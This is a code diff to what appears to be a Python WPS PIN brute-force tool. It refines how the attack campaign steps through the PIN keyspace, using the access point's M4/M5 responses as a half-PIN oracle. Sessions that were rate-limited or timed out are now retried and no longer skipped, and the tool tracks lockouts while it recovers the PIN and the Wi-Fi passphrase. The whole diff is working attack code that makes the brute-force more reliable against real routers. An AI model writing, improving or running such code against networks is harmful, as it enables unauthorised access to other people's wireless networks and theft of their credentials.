@@ -38,7 +38,8 @@ class CampaignState:
     p1_index: int = 0
     first_half: Optional[str] = None
     p2_index: int = 0
-    attempts: int = 0
+    attempts: int = 0           # sessions started (incl. rate-limited no-ops)
+    tested: int = 0             # attempts that actually reached the M4 oracle
     found_pin: Optional[str] = None
     found_psk: Optional[str] = None
     updated: float = 0.0
@@ -178,38 +179,38 @@ class WpsCampaign:
         return None
 
     def _apply_outcome(self, pin: str, out: AttemptOutcome) -> None:
-        """Advance the keyspace + state based on one attempt's result."""
+        """Advance the keyspace from one attempt.
+
+        ONLY a real oracle result (we reached M4 and the AP judged the half)
+        advances the position. A pre-oracle reject — PROTO_ERROR / TIMEOUT, i.e.
+        the AP refused the session before M4, almost always rate-limiting —
+        means the PIN was NOT tested, so we leave the position put and retry the
+        SAME pin after backoff. (Advancing here was a bug: it silently skipped
+        untested PINs the moment the AP started rate-limiting.)
+        """
         st = self.state
+        if out.result in (PinResult.PROTO_ERROR, PinResult.TIMEOUT):
+            self.lock.note_pre_oracle_reject()
+            return
+
+        st.tested += 1
+        self.lock.note_progress()
         if out.result is PinResult.SUCCESS:
             st.found_pin, st.found_psk, st.phase = pin, out.psk, "done"
-            self.lock.note_progress()
-            return
-        if out.first_half_ok:
-            # AP reached M5 → this first half is correct. Pin it and switch.
-            self.lock.note_progress()
+        elif out.first_half_ok:
+            # AP reached M5 → this first half is correct. (Covers SECOND_HALF_WRONG,
+            # whose first_half_ok is True.) Pin it on the first confirmation.
             if st.phase != "second_half":
                 st.first_half = pinmod.split_pin(pin)[0]
                 st.phase, st.p2_index = "second_half", 0
                 self.log(f"[WPS] first half CONFIRMED: {st.first_half} — sweeping second half")
             else:
                 st.p2_index += 1
-            return
-        if out.result is PinResult.FIRST_HALF_WRONG:
-            self.lock.note_progress()
+        elif out.result is PinResult.FIRST_HALF_WRONG:
             if st.phase == "common":
                 st.common_index += 1
             elif st.phase == "first_half":
                 st.p1_index += 1
-            return
-        if out.result is PinResult.SECOND_HALF_WRONG:
-            # Only reached in second_half phase (first_half_ok handles phase-1).
-            self.lock.note_progress()
-            st.p2_index += 1
-            return
-        # TIMEOUT / PROTO_ERROR — no oracle decision; maybe a lock.
-        self.lock.note_pre_oracle_reject()
-        if st.phase == "common":
-            st.common_index += 1     # don't get stuck on a flaky common pin
 
     async def _run(self) -> None:
         self.status = "running"
